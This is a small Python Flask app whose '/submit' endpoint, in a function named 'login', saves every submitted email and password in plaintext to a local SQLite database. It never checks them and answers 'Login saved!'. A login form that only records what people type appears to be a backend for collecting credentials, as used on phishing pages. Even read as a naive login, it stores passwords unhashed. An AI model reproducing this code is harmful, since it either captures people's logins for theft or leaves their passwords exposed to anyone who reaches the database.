from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    conn = sqlite3.connect('/data/users.db')
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (email TEXT, password TEXT)")
    c.execute("INSERT INTO users (email, password) VALUES (?, ?)", (email, password))
    conn.commit()
    conn.close()
    return "Login saved!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

